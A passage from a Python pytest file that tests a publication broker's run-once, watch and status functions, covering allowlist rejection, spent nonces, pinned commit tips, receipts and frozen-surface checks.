    outbox, receipts = tmp_path / "outbox", tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env, str(outbox))
    broker.pin_tip(pins_path, tip_sha)
    allow_path = _allow_yaml(tmp_path, entry)
    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=allow_path, spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=True, runner=_Runner())
    assert results == [{"nonce": env["nonce"], "status": "pushed"}]
    receipt = envelope.read_receipt(str(receipts), env["nonce"])
    assert receipt["status"] == "pushed" and receipt["receipt_sha"] == tip_sha
    assert envelope.list_outbox(str(outbox)) == []       # archived out of the live outbox
    assert (processed / f"{env['nonce']}.json").exists()
    assert broker.is_spent(spent_path, env["nonce"]) is True


def test_run_once_rejected_envelope_writes_a_rejected_receipt(tmp_path):
    rig = _rig(tmp_path)
    env = _env_for(rig)     # no allowlist at all -> reject
    outbox = tmp_path / "outbox"
    receipts = tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env, str(outbox))
    allow_path = tmp_path / "empty.yaml"
    allow_path.write_text("publications: []\n", encoding="utf-8")
    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=str(allow_path), spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=True, runner=_Runner())
    assert results == [{"nonce": env["nonce"], "status": "rejected"}]
    receipt = envelope.read_receipt(str(receipts), env["nonce"])
    assert receipt["status"] == "rejected" and "allowlist" in receipt["detail"]
    assert broker.is_spent(spent_path, env["nonce"]) is True


def test_run_once_processes_multiple_envelopes(tmp_path):
    rig1 = _rig(tmp_path / "r1")
    env1 = _env_for(rig1, nonce="nonceaaaa")
    outbox = tmp_path / "outbox"
    receipts = tmp_path / "receipts"
    pins_path, spent_path = _authority_paths(tmp_path)
    processed = tmp_path / "processed"
    envelope.write_envelope(env1, str(outbox))
    entry1 = rig1[5]
    broker.pin_tip(pins_path, rig1[4])
    allow_path = _allow_yaml(tmp_path, entry1)
    results = broker.run_once(outbox_dir=str(outbox), receipts_dir=str(receipts),
                              allowlist_path=allow_path, spent_path=spent_path,
                              pins_path=pins_path, processed_dir=str(processed),
                              unattended=True, runner=_Runner())
    assert len(results) == 1 and results[0]["status"] == "pushed"


# -- watch: unattended is REQUIRED (CRITICAL-1c) ---------------------------------------------
def test_watch_refuses_without_unattended(tmp_path):
    import pytest
    outbox, receipts, allow_path = tmp_path / "outbox", tmp_path / "receipts", tmp_path / "allow.yaml"
    allow_path.write_text("publications: []\n", encoding="utf-8")
    pins_path, spent_path = _authority_paths(tmp_path)
    with pytest.raises(ValueError, match="unattended"):
        broker.watch(outbox_dir=str(outbox), receipts_dir=str(receipts),
                    allowlist_path=str(allow_path), spent_path=spent_path,
                    pins_path=pins_path, processed_dir=str(tmp_path / "processed"))


def test_watch_bounded_iterations_calls_run_once_each_time(tmp_path):
    outbox, receipts, allow_path = tmp_path / "outbox", tmp_path / "receipts", tmp_path / "allow.yaml"
    allow_path.write_text("publications: []\n", encoding="utf-8")
    pins_path, spent_path = _authority_paths(tmp_path)
    slept = []
    n = broker.watch(outbox_dir=str(outbox), receipts_dir=str(receipts),
                     allowlist_path=str(allow_path), spent_path=spent_path,
                     pins_path=pins_path, processed_dir=str(tmp_path / "processed"),
                     unattended=True, max_iters=3,
                     sleep_fn=lambda s: slept.append(s), poll_s=0.01)
    assert n == 3
    assert slept == [0.01, 0.01]              # sleeps BETWEEN iterations, not after the last


# -- FROZEN_SURFACES ("Freezing", the design's own binding rule) ---------------------------
def test_broker_and_envelope_and_deploy_join_frozen_surfaces():
    assert _is_frozen("orchestrator/broker.py", hs.FROZEN_SURFACES)      # exact path
    assert _is_frozen("reporting/envelope.py", hs.FROZEN_SURFACES)       # exact path
    assert _is_frozen("deploy/user-factory/04-install-broker-agent.sh", hs.FROZEN_SURFACES)


# -- status -----------------------------------------------------------------------------------
def test_status_reports_pending_and_receipts(tmp_path):
    rig = _rig(tmp_path)
    env = _env_for(rig)
    outbox, receipts = tmp_path / "outbox", tmp_path / "receipts"
    envelope.write_envelope(env, str(outbox))
    envelope.write_receipt(nonce="other", status="pushed", receipts_dir=str(receipts))
    st = broker.status(outbox_dir=str(outbox), receipts_dir=str(receipts))
    assert st["pending"] == [env["nonce"]]
    assert st["receipts"] == ["other"]
    assert st["outbox_dir"] == str(outbox) and st["receipts_dir"] == str(receipts)
    assert st["outbox_exists"] is True and st["ok"] is True and st["bare_missing"] == []


# -- status: F1 (round-2 integration fix) — resolved-path visibility + missing-spool -------
def test_status_reports_not_ok_when_outbox_does_not_exist(tmp_path):
    st = broker.status(outbox_dir=str(tmp_path / "nope"), receipts_dir=str(tmp_path / "r"))
    assert st["outbox_exists"] is False and st["ok"] is False
    assert st["pending"] == []             # never crashes on a missing dir


def test_status_reports_missing_allowlist_bare_paths(tmp_path):
    outbox = tmp_path / "outbox"
    outbox.mkdir()
    allow_path = tmp_path / "allow.yaml"
    allow_path.write_text(
        "publications:\n"
        "  - repo_slug: o/r\n"
        "    remote_url: x\n"
        "    base_branch: base\n"
        f"    bare_path: {tmp_path / 'does-not-exist.git'}\n", encoding="utf-8")
    st = broker.status(outbox_dir=str(outbox), receipts_dir=str(tmp_path / "r"),
                       allowlist_path=str(allow_path))
    assert st["ok"] is False
    assert st["bare_missing"] == [str(tmp_path / "does-not-exist.git")]


def test_status_ok_when_outbox_and_every_bare_path_exist(tmp_path):
    rig = _rig(tmp_path)
    _, bare_path, _, _, _, entry = rig
    outbox = tmp_path / "outbox"
    outbox.mkdir()
    allow_path = _allow_yaml(tmp_path, entry)
    st = broker.status(outbox_dir=str(outbox), receipts_dir=str(tmp_path / "r"),
                       allowlist_path=allow_path)
    assert st["ok"] is True and st["bare_missing"] == []
